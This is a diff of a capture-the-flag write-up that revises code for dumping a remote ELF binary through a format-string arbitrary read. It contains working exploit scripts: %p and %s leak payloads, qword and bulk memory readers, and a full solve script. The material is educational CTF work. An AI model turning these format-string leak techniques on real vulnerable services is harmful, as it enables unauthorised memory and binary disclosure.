@@ -94,71 +94,38 @@ We could go ahead with using `dump_string` to try and fully dump the program, bu
 From here, I'll go over two solutions to this that both independently reduce the amount of calls by ~8x.  
 
 ## arb read improvement
-The first thing you should do is to try and improve your arbitrary read, if you can. For us, we can do this by sending multiple `%s` in our format string like so:
+The first thing you should do is to try and improve your arbitrary read, if you can. 
+For us, we can fix this by reading multiple (`%s`es), all trying to read `addr+1`, `addr+2`, `addr+3` and so on. This significantly helps dump areas with heavy amounts of null bytes. While `pwntools` doesn't currently have something for this, `doglib` does under `FmtStrReader`:
 ```python
-def dump_qword(addr):
-    start, end = '', b''
-    cnt = 0
-    skip = set()
-    
-    # first we build the payload. make a separate %s payload to leak each byte in 'addr'
-    # skipping when that have '\x0a' in them
-    for i in range(8):
-        baddr = p64(addr+i)
-        if b"\n" in baddr:
-            skip.add(i)
-            continue
-        start += f'%{22+cnt}$s'+'QWERTYUIOPA' # delimit each %s so we know what's what
-        end += baddr
-        cnt += 1
-    
-    # pad it to ensure offsets are right
-    payload = start.encode().ljust(128,b'\0') + end
-    
-    # split it
-    leak = (do(payload)).split(b'QWERTYUIOPA')
-    leak[-1] = b''
-    
-    # add skipped addrs as 'nothing'
-    for i in sorted(skip):
-        leak.insert(i,b'')
+def do(payload):
+    assert len(payload) < 256
+    p.sendline(payload)
+    return p.recv().removesuffix(b"> ")
 
-    # admittedly pretty gross
-    # but build the final qword, looking in the previous leak when we hit a skip byte
-    final = bytearray()
-    for i in range(8):
-        if i in skip: # if this is an \x0a addr
-            if i > 0 and len(leak[i - 1]) > 1: # if the %s before it leaked 2+ characters
-                final.append(leak[i - 1][1]) # use that second character
-            else:
-                final.append(0) # otherwise just assume \x00 and move on
-        else: # if it's not
-            chunk = leak[i] # we can just use the leaked data directly
-            final.append(chunk[0] if chunk else 0)
-            
-    return bytes(final)
-```
-The code is admittedly a little grosser (mostly because of the banned `\n` requirement) but we now
-consistently leak 8 bytes at a time instead of an unknown amount. We do this by sending 8 `%s` payloads each setup to read `addr`, `addr+1`, `addr+2`. We then set a large 'delimiter' between each of them (here `QWERTYUIOPA`), which means we get back something like this:
-```python
-b'qQWERTYUIOPA\nQWERTYUIOPAQWERTYUIOPAQWERTYUIOPAQWERTYUIOPAWQWERTYUIOPAeQWERTYUIOPAlQWERTYUIOPA'
-```
-By splitting this up into chunks based on the `QWERTYUIOPA` delimiter, we get:
-```python
-[b'q', b'\n', b'', b'', b'', b'W', b'e', b'l']
-```
-The indexes with nothing in them have to have null bytes at that address since nothing was printed, meaning we now know the data at that qword is
-```python
-b'q\n\x00\x00\x00Wel
-```
-It's slightly more complicated than this (we have to accurately leak addresses that contain `\x0a`, which we do by reading the second byte of `addr-1` if it's there), but that's the general idea.  
-This significantly increases our speed from about ~18k calls down to ~2k. With this function, we can instead write:
-```python
+def dofmt(payload):
+    assert len(payload) < 256
+    p.sendline(payload)
+    return p.recvuntil(b'FMTLKEND')+p.recv().removesuffix(b"> ")
+
+# consistently dump 8 bytes at 'addr'
+def dump_qword(addr):
+    # 6 is the first offset our input shows up at
+    x = FmtStrReader(6,badchars=b'\n')
+    pl = x.payload(addr,8)
+    out = dofmt(pl) # send payload, get response
+    return x.parse(out) # send response to .parse() to get correct bytes back
+
 pie_leak = int(do(b"%p"), 16)
 logx(pie_leak)
 fun = DumpELF(dump_qword,pie_leak)
 fun.dump("./printful.bin") # attempted ELF dump
 ```
+Behind the scenes, `pl` looks something like:
+```bash
+FMTLKSTART%35$sFMTLKDLM%36$sFMTLKDLM%37$sFMTLKDLM%38$sFMTLKDLM%39$sFMTLKDLM%40$sFMTLKDLM%41$sFMTLKDLM%42$sFMTLKEND
+```
+where each format specifier has the unique string `FMTLKDLM` between them. That means when we recieve the format string's output, `.parse()` can split it on said delimiter and determine exactly what each `%s` leaked. If there is nothing between two delimiters, then we know there was a null byte at that address. There is some more advanced stuff we have to do (mostly dealing with bad character requirements) but that's the TLDR.  
+Anyways, this optimization significantly increases our speed from about ~18k calls down to ~2k. With this function, we can give DumpELF a try.  
 DumpELF will use `dump_qword` to dump all the necessary bytes of the ELF, *attempt* (this is difficult) to reconstruct the original ELF, then write it to `./printful.bin`. Let's give it a shot!
 ```bash
 corgo@dog-computer:~/pwn/buckeye/printful$ python3 ./solve2.py
@@ -210,184 +177,61 @@ def bulk_dump(addr,cnt):
 ```
 Here's a correctly written `bulk_dump` for our situation. Again it is quite complicated due to format strings being difficult to work with for arbitrary reads, but hopefully you can make some sense of it:
 ```python
-# make a format string payload to leak 8 bytes at 'addr'
-def make_qword(addr):
-    start, end = '', b''
-    cnt = 0
-    skip = set()
-    
-    # first we build the payload. make a separate %s payload to leak each byte in 'addr'
-    # skipping when that have '\x0a' in them
-    for i in range(8):
-        baddr = p64(addr+i)
-        if b"\n" in baddr:
-            skip.add(i)
-            continue
-        start += f'%{23+cnt}$s'+'QWERTYUIOPA' # delimit each %s so we know what's what
-        end += baddr
-        cnt += 1
-    # start 
-    
-    # pad it to ensure offsets are right
-    start = (start.encode()+b'DELIMIT\0'+p64(0))[:0x80]
-    payload = start + b'DELIMIT\0' + end
-    return payload, skip
+def domany(payload, amt):
+    p.sendline(payload)
+    leak = []
+    for _ in range(amt):
+        leak.append(p.recvuntil(b'FMTLKEND').removeprefix(b"> "))
+    return leak
 
-# given a leak from make_qword, and the bytes we should skip, parse the important bytes out
-def parse_result(leak, skip):
-    # logx(leak)
-    for i in sorted(skip):
-        leak.insert(i,b'')
-    # logx(leak)
-
-    # admittedly pretty gross
-    # but build the final qword, looking in the previous leak when we hit a skip byte
-    final = bytearray()
-    for i in range(8):
-        if i in skip: # if this is an \x0a addr
-            if i > 0 and len(leak[i - 1]) > 1: # if the %s before it leaked 2+ characters
-                final.append(leak[i - 1][1]) # use that second character
-            else:
-                final.append(0) # otherwise just assume \x00 and move on
-        else: # if it's not
-            chunk = leak[i] # we can just use the leaked data directly
-            final.append(chunk[0] if chunk else 0)
-    return bytes(final)
-
-def bulk_dump(addr, cnt):
-    cnt = min(0xf0,cnt) # adjust based on your findings. you may not even need a cap
-    big = b''
-    skips = []
-    # separate 'cnt' into multiple make_qword payloads
-    # to separate payloads, we write the word 'DELIMIT' at the end of each
-    for x in range(0,cnt,8):
-        pl, sk = make_qword(addr+x)
-        skips.append(sk)
-        big += pl + b'\0'*7+b'\n'
-    p.send(big)
-    
-    result = p.recv()
-    # we sent cnt//8 payloads, so we should expect cnt//8 'DELIMIT's in the output
-    # keep receiving until we get everything we want
-    while result.count(b'DELIMIT') != max(cnt//8,1):
-        # print(result.count(b'DELIMIT'),cnt//8)
-        result += p.recv()
-
-    leaks = result.split(b'DELIMIT')
-    if leaks[-1] == b'> ': # this is sometimes here at the end, it's just the prompt
-        leaks.pop(-1)
-
-    final = b''
-    for leak, skip in zip(leaks,skips):
-        leak = leak.removeprefix(b'> ')
-        final += parse_result(leak.split(b'QWERTYUIOPA'),skip)
-    # info(f"asked for {cnt} got {len(final)}")
-    return final
+def bulkdump(addr, cnt):
+    cnt = min(0x80, cnt)
+    x = FmtStrReader(6,badchars=b'\n')
+    payloads = b'\n'.join(x.payload(addr+i,8) for i in range(0,cnt,8))
+    out = domany(payloads,cnt//8)
+    return b''.join(x.parse(y) for y in out)
 ```
-The original `dump_qword` has been mostly unchanged, I've just split it up into two functions for usability. The only important thing I do now is write `DELIMIT` at the end of each format string payload we send at once, so that when we can correctly split up all the responses we get back.  
-The other notable thing I do is this:
+We haven't changed much from `dump_qword`, other than generating and sending multiple `FmtStrReader` payloads at once. The only thing worth mentioning is this code:
 ```python
-result = p.recv()
-while result.count(b'DELIMIT') != max(cnt//8,1):
-    # print(result.count(b'DELIMIT'),cnt//8)
-    result += p.recv()
+for _ in range(amt):
+    leak.append(p.recvuntil(b'FMTLKEND').removeprefix(b"> "))
 ```
-The remote server will likely not send everything back at once. You should continue trying to read from the server until you get the amount of expected responses back. Here, since I sent `cnt//8` format string payloads with `DELIMIT` at the end, I keep asking for more data until `result` contains exactly that many `DELIMIT`s.  
+The remote server will likely not send everything back at once. You should continue trying to read from the server until you get the amount of expected responses back. Here, since I sent `amt//8` format string payloads that each end with `FMTLKEND`, I keep asking for more data until `leak` contains exactly that many `FMTLKEND`s.  
 
 
-With the ability to leak a near-arbitrary amount of data in a single .send(), your time-to-leak should drop significantly-- needing about 2000 calls from `dump_qword` to only 100 from `dump_bulk`. Here's the full solution making use of `bulk_write`:
+With the ability to leak a near-arbitrary amount of data in a single .send(), your time-to-leak should drop significantly-- previously needing ~2000 calls from `dump_qword` to only 100 from `bulkdump`. Here's the full solution making use of bulk writes:
 ```python
 #!/usr/bin/env python3
-
 from dog import *
+context.arch = 'amd64'
 
 def do(payload):
+    assert len(payload) < 256
     p.sendline(payload)
-    out = p.recv()
-    # if len(out) == 2: # sometimes buffering means we only get the '> '
-    #     return p.recv() # so this must be the actual response
-    return out.removesuffix(b"> ")
+    return p.recv().removesuffix(b"> ")
 
-def make_qword(addr):
-    start, end = '', b''
-    cnt = 0
-    skip = set()
-    
-    # first we build the payload. make a separate %s payload to leak each byte in 'addr'
-    # skipping when that have '\x0a' in them
-    for i in range(8):
-        baddr = p64(addr+i)
-        if b"\n" in baddr:
-            skip.add(i)
-            continue
-        start += f'%{23+cnt}$s'+'QWERTYUIOPA' # delimit each %s so we know what's what
-        end += baddr
-        cnt += 1
-    # start 
-    
-    # pad it to ensure offsets are right
-    start = (start.encode()+b'DELIMIT\0'+p64(0))[:0x80]
-    payload = start + b'DELIMIT\0' + end
-    return payload, skip
+def domany(payload, amt):
+    p.sendline(payload)
+    leak = []
+    for _ in range(amt):
+        leak.append(p.recvuntil(b'FMTLKEND').removeprefix(b"> "))
+    return leak
 
-def parse_result(leak, skip):
-    # logx(leak)
-    for i in sorted(skip):
-        leak.insert(i,b'')
-    # logx(leak)
+def bulkdump(addr, cnt):
+    cnt = min(0x80, cnt)
+    x = FmtStrReader(6,badchars=b'\n')
+    payloads = b'\n'.join(x.payload(addr+i,8) for i in range(0,cnt,8))
+    out = domany(payloads,cnt//8)
+    return b''.join(x.parse(y) for y in out)
 
-    # admittedly pretty gross
-    # but build the final qword, looking in the previous leak when we hit a skip byte
-    final = bytearray()
-    for i in range(8):
-        if i in skip: # if this is an \x0a addr
-            if i > 0 and len(leak[i - 1]) > 1: # if the %s before it leaked 2+ characters
-                final.append(leak[i - 1][1]) # use that second character
-            else:
-                final.append(0) # otherwise just assume \x00 and move on
-        else: # if it's not
-            chunk = leak[i] # we can just use the leaked data directly
-            final.append(chunk[0] if chunk else 0)
-    return bytes(final)
-
-# bulk dump up to 0xf0 bytes at a time
-def bulk_dump(addr, cnt):
-    cnt = min(0xf0,cnt) # adjust based on your findings. you may not even need a cap
-    big = b''
-    skips = []
-    # separate 'cnt' into multiple make_qword payloads
-    # to separate payloads, we write the word 'DELIMIT' at the end of each
-    for x in range(0,cnt,8):
-        pl, sk = make_qword(addr+x)
-        skips.append(sk)
-        big += pl + b'\0'*7+b'\n'
-    p.send(big)
-    
-    result = p.recv()
-    # we sent cnt//8 payloads, so we should expect cnt//8 'DELIMIT's in the output
-    # keep receiving until we get everything we want
-    while result.count(b'DELIMIT') != max(cnt//8,1):
-        # print(result.count(b'DELIMIT'),cnt//8)
-        result += p.recv()
-
-    leaks = result.split(b'DELIMIT')
-    if leaks[-1] == b'> ': # this is sometimes here at the end, it's just the prompt
-        leaks.pop(-1)
-
-    final = b''
-    for leak, skip in zip(leaks,skips):
-        leak = leak.removeprefix(b'> ')
-        final += parse_result(leak.split(b'QWERTYUIOPA'),skip)
-    # info(f"asked for {cnt} got {len(final)}")
-    return final
-
-
-p = remote("localhost",1024)
-# p = process("./printful")
+# p = remote("localhost",1024)
+p = process("./printful.bin")
 p.recvuntil(b"> ")
-pie_leak = int(do(b"%p"), 16)
-fun = DumpELF(bulk_dump,pie_leak,bulk=True)
-fun.dump("./printful4.bin") # it works!!!!
+leak = int(do(f"%p"), 16)
+
+y = DumpELF(bulkdump, leak, bulk=True)
+y.dump('./wewin.bin')
+p.close() # PLIMB's up!
 ```
 Hopefully you now understand how to correctly use this library!
 
@@ -395,3 +239,4 @@ Hopefully you now understand how to correctly use this library!
 While this feature is pretty cool, I would only use it as a last-resort option where the original ELF is a NEED to solve the challenge. Leaking libc and performing some arbitrary write to RCE technique would've absolutely been enough to solve this challenge, I just used it as a testbed.  
 If DumpELF fails to reconstruct the program after multiple tries, you can just try dumping all the memory you can leak to disk. It won't run, but IDA can load it (after some scolding) and the decompiler will still work. (Note that there won't be any function information and IDA will probably miss some!)  
 If the two previous optimizations still aren't enough, you could *try* leaking the binary in multiple connections. I haven't tested this, it may completely break (especially on PIE binaries), but it's worth a shot.  
+
